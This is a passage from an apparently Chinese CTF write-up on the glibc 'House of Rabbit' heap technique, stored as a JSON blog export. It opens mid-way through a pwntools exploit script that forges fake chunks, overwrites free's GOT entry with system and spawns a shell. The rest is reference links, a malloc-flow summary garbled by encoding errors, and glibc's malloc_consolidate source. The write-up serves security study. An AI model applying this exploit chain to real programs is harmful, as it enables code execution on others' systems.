cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Del>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xa00001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13337</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>å‚è€ƒ</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyNi1ob3VzZS1vZi1yYWJiaXQ=\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#26-house-of-rabbit</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hMWV4Lm9ubGluZS8yMDIwLzEwLzE1L0hvdXNlLW9mLVJhYmJpdCVFNSVBRCVBNiVFNCVCOSVBMC8=\">https://a1ex.online/2020/10/15/House-of-Rabbit å­¦ä¹  /</span></p>\n</blockquote>\n<blockquote>\n<p>å¢æ–‡</p>\n<p>malloc å…¨æµç¨‹</p>\n<pre><code>é¦–å…ˆæ˜¯æ£€æŸ¥æ˜¯å¦æ»¡è¶³fastbinå¤§å°è¦æ±‚ï¼Œæ»¡è¶³ä¸”å­˜åœ¨é€‚åˆçš„chunkå°±ä»fastbinä¸­åˆ†é…\n\nç„¶åæ£€æŸ¥æ˜¯å¦æ»¡è¶³smallbinï¼Œæ»¡è¶³ä¸”å­˜åœ¨é€‚åˆçš„chunkå°±ä»smallbinä¸­åˆ†é…\n\nåŒæ—¶æ£€æŸ¥æ˜¯å¦æ»¡è¶³largebinï¼Œæ»¡è¶³å°±è®¡ç®—ä¸€ä¸‹æ‰€å±çš„largebinçš„ç´¢å¼•idx\n\nè¿›è¡Œunsortedbinçš„å¤„ç†è¿‡ç¨‹ï¼Œä»åå‘å‰éå†unsortedbiné“¾è¡¨ï¼Œæ»¡è¶³åˆ‡å‰²åˆ†é…å°±åˆ‡å‰²åˆ†é…ï¼Œå¤§å°ç²¾ç¡®åŒ¹é…å°±åˆ†é…ï¼Œå¤§å°ä¸åŒ¹é…çš„å°±æ ¹æ®å¤§å°è£…å…¥largebinå’Œsmallbin\n\næ³¨æ„ï¼šè¿™é‡Œä¼šæ£€æŸ¥ç”³è¯·å¤§å°æ˜¯å¦è¶…å‡ºç³»ç»Ÿå†…å­˜ï¼è¿™æ˜¯è¯¥ç‰ˆæœ¬mallocä¸­å”¯ä¸€æ£€æŸ¥çš„åœ°æ–¹ï¼Œå¦‚æœæ²¡æœ‰unsortedbinï¼Œå°±ä¸è¿›è¡Œæ£€æŸ¥\nunsortedbinå¤„ç†å®Œä¹‹åï¼Œä»largebinä¸­æ‰¾æ»¡è¶³å¤§å°è¦æ±‚çš„chunkåˆ†é…ï¼Œè¦ä¹ˆç›´æ¥åˆ†é…å‡ºå»ï¼Œè¦ä¹ˆåˆ‡å‰²åˆ†é…å‡ºå»ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†è£…å…¥unsortedbin\n\nlargebinä¸­æœ€å¤§çš„chunkèŒƒå›´æ˜¯0x80000 - âˆ\nä»largebinä¸­åˆ†é…ä¸æ£€æŸ¥ç”³è¯·å¤§å°æ˜¯å¦è¶…å‡ºç³»ç»Ÿå†…å­˜\næœ€ååœ¨ä»top chunkåˆ†é…ï¼Œåˆ†é…ä¸äº†å°±ç”¨sysmallocå»æ˜ å°„å†…å­˜æˆ–è€…æ‰©å¤§top chunk\n</code></pre>\n</blockquote>\n<blockquote>\n<p><code>malloc_consolidate</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> mfastbinptr<span class=\"token operator\">*</span>    fb<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* current fastbin being consolidated */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> mfastbinptr<span class=\"token operator\">*</span>    maxfb<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* last fastbin (for loop control) */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> mchunkptr       p<span class=\"token punctuation\">;</span>                  <span class=\"token comment\">/* current chunk being consolidated */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> mchunkptr       nextp<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* next chunk to consolidate */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> mchunkptr       unsorted_bin<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* bin header */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> mchunkptr       first_unsorted<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* chunk to link to */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token comment\">/* These have same use as in free() */</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> mchunkptr       nextchunk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> INTERNAL_SIZE_T size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> INTERNAL_SIZE_T nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> INTERNAL_SIZE_T prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token keyword\">int</span>             nextinuse<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> mchunkptr       bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> mchunkptr       fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token function\">atomic_store_relaxed</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>av<span class=\"token operator\">-></span>have_fastchunks<span class=\"token punctuation\">,</span> false<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> unsorted_bin <span class=\"token operator\">=</span> <span class=\"token function\">unsorted_chunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre> <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   Remove each chunk from fast bin and consolidate it, placing it</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>   then in unsorted bin. Among other reasons for doing this,</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>   placing in unsorted bin avoids needing to calculate actual bins</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>   until malloc is sure that chunks aren't immediately going to be</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>   reused anyway.</pre></td></tr><tr><td data-num=\"29\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre> maxfb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> NFASTBINS <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre> <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   p <span class=\"token operator\">=</span> <span class=\"token function\">atomic_exchange_acq</span> <span class=\"token punctuation\">(</span>fb<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>     <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> idx <span class=\"token operator\">=</span> <span class=\"token function\">fastbin_index</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> fb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t    <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc_consolidate(): invalid chunk size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token function\">check_inuse_chunk</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tnextp <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token comment\">/* Slightly streamlined version of consolidation code in free() */</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tnextchunk <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tnextsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t  prevsize <span class=\"token operator\">=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t  size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t  p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t  <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nextchunk <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t  nextinuse <span class=\"token operator\">=</span> <span class=\"token function\">inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> nextsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t    size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t    <span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t  first_unsorted <span class=\"token operator\">=</span> unsorted_bin<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t  unsorted_bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t  first_unsorted<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t    p<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t    p<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t  <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t  p<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> unsorted_bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t  p<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> first_unsorted<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t  <span class=\"token function\">set_foot</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t  size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t  <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t  av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> nextp<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fb<span class=\"token operator\">++</span> <span class=\"token operator\">!=</span> maxfb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure></blockquote>\n",
            "tags": [
                "houseç³»åˆ—",
                "house-of-rabbit"
            ]
        }
    ]
}